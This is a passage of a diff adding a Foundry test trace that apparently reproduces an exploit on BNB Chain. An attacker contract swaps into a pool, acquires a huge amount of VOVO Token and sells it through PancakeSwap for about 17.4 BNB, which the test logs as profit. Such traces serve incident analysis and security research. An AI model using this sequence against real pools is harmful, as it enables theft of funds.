+    │   │   ├─ [785824] PancakeV3Pool::swap(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], true, 12468049200757089736 [1.246e19], 4295128740 [4.295e9], 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000040000000000000000000000000959951c51b3e4b4eaa55a13d1d761e14ad0a1d6a000000000000000000000000000000000000000000000000000000000000002b2ff960f1d9af1a6368c2866f79080c1e0b2539970009c458b26c9b2d32df1d0e505bcca2d776698c9be6b6000000000000000000000000000000000000000000)
+    │   │   │   ├─ [37599] VOVO Token::transfer(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 12608287525767706916530637084 [1.26e28])
+    │   │   │   │   ├─ emit Transfer(from: PancakeV3Pool: [0xe70294c3D81ea914A883ad84fD80473C048C028C], to: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], value: 12608287525767706916530637084 [1.26e28])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x69fa50d4fa573c735a799bfd2bed636aab9d5451531e49e49d4fa63e4c237fd2: 0x000000000000000000000000000000000000000028bd54de9ff3992bf27e7c31 → 0x000000000000000000000000000000000000000000000022496ef150519f3315
+    │   │   │   │   │   @ 0x6cbfc60506a0e2fd22187a417933729507a926b5f9b40f63f4b68d3685aec81c: 0 → 0x000000000000000000000000000000000000000028bd54bc5684a7dba0df491c
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [829] LABUBU::balanceOf(PancakeV3Pool: [0xe70294c3D81ea914A883ad84fD80473C048C028C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 416675367072555478 [4.166e17]
+    │   │   │   ├─ [13720] PancakeSwap: Smart Router V3::pancakeV3SwapCallback(444202760808574918 [4.442e17], -12608287525767706916530637084 [-1.26e28], 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000040000000000000000000000000959951c51b3e4b4eaa55a13d1d761e14ad0a1d6a000000000000000000000000000000000000000000000000000000000000002b2ff960f1d9af1a6368c2866f79080c1e0b2539970009c458b26c9b2d32df1d0e505bcca2d776698c9be6b6000000000000000000000000000000000000000000)
+    │   │   │   │   ├─ [1983] SmartRouterHelper::verifyCallback(0x41ff9AA7e16B8B1a8a8dc4f0eFacd93D02d071c9, LABUBU: [0x2fF960F1D9AF1A6368c2866f79080C1E0B253997], VOVO Token: [0x58B26C9b2d32dF1D0E505BCCa2D776698c9bE6B6], 2500) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000e70294c3d81ea914a883ad84fd80473c048c028c
+    │   │   │   │   ├─ [7757] LABUBU::transferFrom(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], PancakeV3Pool: [0xe70294c3D81ea914A883ad84fD80473C048C028C], 444202760808574918 [4.442e17])
+    │   │   │   │   │   ├─ emit Approval(owner: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], spender: PancakeSwap: Smart Router V3: [0x13f4EA83D0bd40E75C8222255bc855a974568Dd4], value: 12023846439948514818 [1.202e19])
+    │   │   │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: PancakeV3Pool: [0xe70294c3D81ea914A883ad84fD80473C048C028C], value: 444202760808574918 [4.442e17])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x55cb45f773ce66ae81a414ba2ddeaf419ca7320371825a945ff293cc921a9257: 0x000000000000000000000000000000000000000000000000ad0768b0853825c8 → 0x000000000000000000000000000000000000000000000000a6dd48a1cef9f602
+    │   │   │   │   │   │   @ 0xa632967b9501d106b7604239970d8a72decfae8c8b91541606d39a1c673c2dcf: 0x000000000000000000000000000000000000000000000000ad0768b0853825c8 → 0x000000000000000000000000000000000000000000000000a6dd48a1cef9f602
+    │   │   │   │   │   │   @ 0x66554859ed55d6eff316e5207ad2fe91421c9cdf5a7ba04fadeb6a64e7a4cd8d: 0x00000000000000000000000000000000000000000000000005c85409e903e1d6 → 0x0000000000000000000000000000000000000000000000000bf274189f42119c
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [829] LABUBU::balanceOf(PancakeV3Pool: [0xe70294c3D81ea914A883ad84fD80473C048C028C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 860878127881130396 [8.608e17]
+    │   │   │   ├─ emit Swap(sender: PancakeSwap: Smart Router V3: [0x13f4EA83D0bd40E75C8222255bc855a974568Dd4], recipient: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], amount0: 444202760808574918 [4.442e17], amount1: -12608287525767706916530637084 [-1.26e28], sqrtPriceX96: 4295128740 [4.295e9], liquidity: 0, tick: -887272 [-8.872e5], protocolFeesToken0: 355362208646860 [3.553e14], protocolFeesToken1: 0)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 2: 0x000000000000000000000000000000000000000224db1d8e7fed45b40ffa0e14 → 0x00000000000000000000000000000000000000046f6f1fd8fdc7e2d04274a665
+    │   │   │   │   @ 0xc274ad25bc5f896f20657eca43a95897d9b50be88cce91b63e47c0fd3d0204e2: 0x016757d357000000000000000000000000000000000000000000000000000000 → 0x0100006c7a000000000000000000000001884970d406856c2d0000018f54fa54
+    │   │   │   │   @ 4: 0x000000000000000af8c75775dcadd2e6000000000000000000012e6a4edb2086 → 0x000000000000000af8c75775dcadd2e600000000000000000002719d8511a752
+    │   │   │   │   @ 9: 0x010000000000000000000000013368168a959933e20000002179fe846757dc6f → 0x01000000000000000000000001884970d406856c2d0000018f54fa5467583fd1
+    │   │   │   │   @ 5: 0x000000000000000000000000000000000000000000012bbd640daf76dd6e36e8 → 0
+    │   │   │   │   @ 0: 0x00000000010001000003ae68000000000002a48f3ec78955743be2fc97e05285 → 0x000000000100010000f2761800000000000000000000000000000001000276a4
+    │   │   │   │   @ 0xc274ad25bc5f896f20657eca43a95897d9b50be88cce91b63e47c0fd3d0204e0: 0 → 0x00000000000000000000000000000000000000046f6f1fd8fdc7e2d04274a665
+    │   │   │   │   @ 0xc274ad25bc5f896f20657eca43a95897d9b50be88cce91b63e47c0fd3d0204e1: 0 → 0x0000000000000000000000000000000000144a43225ccba00b452d42e895eb2e
+    │   │   │   └─ ← [Return] 444202760808574918 [4.442e17], -12608287525767706916530637084 [-1.26e28]
+    │   │   └─ ← [Return] 12608287525767706916530637084 [1.26e28]
+    │   ├─ [25272] VOVO Token::approve(PancakeSwap: Router v2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 12608287525767706916530637084 [1.26e28])
+    │   │   ├─ emit Approval(owner: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], spender: PancakeSwap: Router v2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 12608287525767706916530637084 [1.26e28])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xf610072c5534f233c441420dd840966739e3abee57501a85ef95953bb221422e: 0 → 0x000000000000000000000000000000000000000028bd54bc5684a7dba0df491c
+    │   │   └─ ← [Return] true
+    │   ├─ [118882] PancakeSwap: Router v2::swapExactTokensForETHSupportingFeeOnTransferTokens(12608287525767706916530637084 [1.26e28], 0, [0x58B26C9b2d32dF1D0E505BCCa2D776698c9bE6B6, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 1733836813 [1.733e9])
+    │   │   ├─ [14574] VOVO Token::transferFrom(AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], 0xb98f5322a91019311af43cf1d938AD0c59A6148a, 12608287525767706916530637084 [1.26e28])
+    │   │   │   ├─ emit Transfer(from: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: 0xb98f5322a91019311af43cf1d938AD0c59A6148a, value: 12608287525767706916530637084 [1.26e28])
+    │   │   │   ├─ emit Approval(owner: AttackerC: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], spender: PancakeSwap: Router v2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 0)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xf610072c5534f233c441420dd840966739e3abee57501a85ef95953bb221422e: 0x000000000000000000000000000000000000000028bd54bc5684a7dba0df491c → 0
+    │   │   │   │   @ 0x6b02bcd83b56b47e07df79fa51c474f8cdf48d3da20beda59a52efff1aa29754: 0x000000000000000000000000000000000000000007ad8e9d8641b2072b10e932 → 0x0000000000000000000000000000000000000000306ae359dcc659e2cbf0324e
+    │   │   │   │   @ 0x6cbfc60506a0e2fd22187a417933729507a926b5f9b40f63f4b68d3685aec81c: 0x000000000000000000000000000000000000000028bd54bc5684a7dba0df491c → 0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2893] 0xb98f5322a91019311af43cf1d938AD0c59A6148a::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 2376212717396342608743164210 [2.376e27], 20691163803378235102 [2.069e19], 1733825548 [1.733e9]
+    │   │   ├─ [886] VOVO Token::balanceOf(0xb98f5322a91019311af43cf1d938AD0c59A6148a) [staticcall]
+    │   │   │   └─ ← [Return] 14984500243164049525273801294 [1.498e28]
+    │   │   ├─ [67194] 0xb98f5322a91019311af43cf1d938AD0c59A6148a::swap(0, 17403082890323102166 [1.74e19], PancakeSwap: Router v2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
+    │   │   │   ├─ [29962] wBNB::transfer(PancakeSwap: Router v2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 17403082890323102166 [1.74e19])
+    │   │   │   │   ├─ emit Transfer(from: 0xb98f5322a91019311af43cf1d938AD0c59A6148a, to: PancakeSwap: Router v2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 17403082890323102166 [1.74e19])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x69682ad562b31f8962fcf05d92fe3cae8c83cb62f05747851abeaa986aa190ae: 0x0000000000000000000000000000000000000000000000011f25c7da49c7b6de → 0x0000000000000000000000000000000000000000000000002da19c2b5f64ad08
+    │   │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0 → 0x000000000000000000000000000000000000000000000000f1842baeea6309d6
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [886] VOVO Token::balanceOf(0xb98f5322a91019311af43cf1d938AD0c59A6148a) [staticcall]
+    │   │   │   │   └─ ← [Return] 14984500243164049525273801294 [1.498e28]
+    │   │   │   ├─ [534] wBNB::balanceOf(0xb98f5322a91019311af43cf1d938AD0c59A6148a) [staticcall]
+    │   │   │   │   └─ ← [Return] 3288080913055132936 [3.288e18]
+    │   │   │   ├─ emit Sync(reserve0: 14984500243164049525273801294 [1.498e28], reserve1: 3288080913055132936 [3.288e18])
+    │   │   │   ├─ emit Swap(sender: PancakeSwap: Router v2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 12608287525767706916530637084 [1.26e28], amount1In: 0, amount0Out: 0, amount1Out: 17403082890323102166 [1.74e19], to: PancakeSwap: Router v2: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 9: 0x00000000000000000000000000000000000014ccde140f42c58daf4c61a8c403 → 0x00000000000000000000000000000000000014d3430358ee41ccf4173f66b44d
+    │   │   │   │   @ 8: 0x6758140c0000000000011f25c7da49c7b6de000007ad8e9d8641b2072b10e932 → 0x67583fd10000000000002da19c2b5f64ad080000306ae359dcc659e2cbf0324e
+    │   │   │   │   @ 10: 0x0000000000000000000000035ac3d41d45cee91663957590c692d02e054bf756 → 0x0000000000000000000000035bef6f958c54a35a466eade152d31dcfe2f17558
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [534] wBNB::balanceOf(PancakeSwap: Router v2: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
+    │   │   │   └─ ← [Return] 17403082890323102166 [1.74e19]
+    │   │   ├─ [9223] wBNB::withdraw(17403082890323102166 [1.74e19])
+    │   │   │   ├─ [83] PancakeSwap: Router v2::fallback{value: 17403082890323102166}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit Withdrawal(src: PancakeSwap: Router v2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 17403082890323102166 [1.74e19])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x1fb4de8f865d751e0e8d9986066405ce08df416aff5fdd6299ad70c234250abc: 0x000000000000000000000000000000000000000000000000f1842baeea6309d6 → 0
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [6941] AttackerC::fallback{value: 17403082890323102166}()
+    │   │   │   ├─ [0] attacker::fallback{value: 17403082890323102166}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ emit log_named_decimal_uint(key: "Profit in BNB", val: 17403082890323102166 [1.74e19], decimals: 18)
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 66.17s (65.16s CPU time)
+
+Ran 1 test suite in 74.62s (66.17s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
